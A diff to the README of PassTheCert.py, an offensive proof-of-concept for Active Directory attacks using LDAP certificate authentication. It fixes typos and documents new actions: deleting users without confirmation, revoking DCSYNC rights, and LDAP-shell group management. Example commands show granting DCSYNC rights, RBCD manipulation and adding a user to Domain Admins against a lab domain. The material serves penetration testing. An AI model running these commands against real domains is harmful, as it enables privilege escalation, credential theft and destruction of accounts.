@@ -4,8 +4,8 @@ PassTheCert.py
 This POC implements LDAP certificate authentication for two impacket scripts:
 [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
 and [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py).
-You can perform LDAP certificate authentication both on port 686 and 389 (via a
-StarTLS command). Please note that you need a functional LDAPS service on the
+You can perform LDAP certificate authentication both on ports 636 and 389 (via a
+StartTLS command). Please note that you need a functional LDAPS service on the
 targeted domain controller to successfully use StartTLS on the LDAP port.
 
 More information in the [accompanying blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).
@@ -24,27 +24,30 @@ Usage
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 usage: passthecert.py [-h] [-debug] [-port {389,636}]
-                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]]
-                      [-target sAMAccountName] [-new-pass [Password]] [-elevate] [-baseDN DC=test,DC=local]
-                      [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME]
-                      [-computer-name COMPUTER-NAME$] [-computer-pass password]
-                      [-delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local] [-delegate-to DELEGATE_TO]
-                      [-delegate-from DELEGATE_FROM] [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key
+                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,del_user,whoami,ldap-shell}]]
+                      [-target sAMAccountName] [-new-pass [Password]] [-elevate] [-revert-elevate] [-no-confirm]
+                      [-baseDN DC=test,DC=local] [-computer-group CN=Computers] [-domain test.local]
+                      [-domain-netbios NETBIOSNAME] [-computer-name COMPUTER-NAME$] [-computer-pass password]
+                      [-delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local]
+                      [-delegate-to DELEGATE_TO] [-delegate-from DELEGATE_FROM]
+                      [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key
 
 Manage domain computers and perform RBCD attack via LDAP certificate authentication
 
 options:
   -h, --help            show this help message and exit
   -debug                Turn DEBUG output ON
-  -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.
+  -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 389 or LDAPS on 636.
 
 Action:
-  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]
+  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,del_user,whoami,ldap-shell}]
 
 Manage User:
-  -target             sAMaccountnames   sAMAccountName of user to target.
+  -target             sAMAccountName   sAMAccountName of user to target.
   -new-pass           [Password]        New password of target.
   -elevate                              Grant target account DCSYNC rights
+  -revert-elevate                       Revoke target account DCSYNC rights previously granted by -elevate
+  -no-confirm                           Do not ask for confirmation when deleting a user
 
 Manage Computer:
   -baseDN             DC=test,DC=local  Set baseDN for LDAP.If omitted, the domain part (FQDN) specified in the account parameter will be used.
@@ -76,16 +79,26 @@ Actions
   * `modify_computer`: Modify the password of the computer
 
 * Manage User
-  * `forcePWDchange` : Modify the password of the user
+  * `modify_user -new-pass`: Modify the password of a user
+  * `modify_user -elevate`: Grant a user DCSYNC rights
+  * `modify_user -revert-elevate`: Revoke DCSYNC rights previously granted by `-elevate`
+  * `del_user`: Delete a user after confirmation
+  * `del_user -no-confirm`: Delete a user without asking for confirmation
 
 * Constrained delegation attack
   * `add_computer -delegated-services`: Add a computer configured with constrained delegated services store in `msDS-AllowedToDelegateTo` new computer's attributes.
 
 * RBCD attack
   * `read_rbcd`: Read `msDS-AllowedToActOnBehalfOfOtherIdentity` and resolve SIDs to `sAMaccountnames`
-  * `write_rbcd`: Write new SIDs to `the msDS-AllowedToActOnBehalfOfOtherIdentity`
+  * `write_rbcd`: Write new SIDs to the `msDS-AllowedToActOnBehalfOfOtherIdentity`
   * `remove_rbcd`: Remove specific entries
   * `flush_rbcd`: Flush all entries
+
+* LDAP shell user management
+  * `add_user`: Create a user through the interactive LDAP shell
+  * `add_user_to_group`: Add a user to a group through the interactive LDAP shell
+  * `get_user_groups`: Retrieve all groups a user belongs to
+  * `remove_user_from_group`: Remove a user from a group through the interactive LDAP shell
 
 * Misc
   * `whoami`: Return the user represented by the certificate
@@ -153,6 +166,24 @@ Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 [*] Granted user 'user_sam' DCSYNC rights!
 ```
 
+Revoke DCSYNC rights previously granted to a user:
+
+```console
+$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -revert-elevate
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+[*] Revoked DCSYNC rights from user 'user_sam'.
+```
+
+Delete a user without confirmation:
+
+```console
+$ python3 passthecert.py -action del_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -no-confirm
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+[*] Successfully deleted user 'user_sam'.
+```
+
 Spawn an interactive LDAP shell and add a user to a specific domain group
 
 ```console
@@ -164,6 +195,17 @@ Adding user: user_sam to group Domain Admins result: OK
 ```
 
 *Note: The above example assumes that the domain account for which the certificate was issued, holds privileges to add users to the target domain group.*
+
+Spawn an interactive LDAP shell and remove a user from a specific domain group:
+
+```console
+$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+# remove_user_from_group user_sam "Domain Admins"
+```
+
+*Note: The above example assumes that the domain account for which the certificate was issued holds privileges to remove users from the target domain group.*
 
 Spawn an interactive LDAP shell and retrieve all groups the user is a member of
 
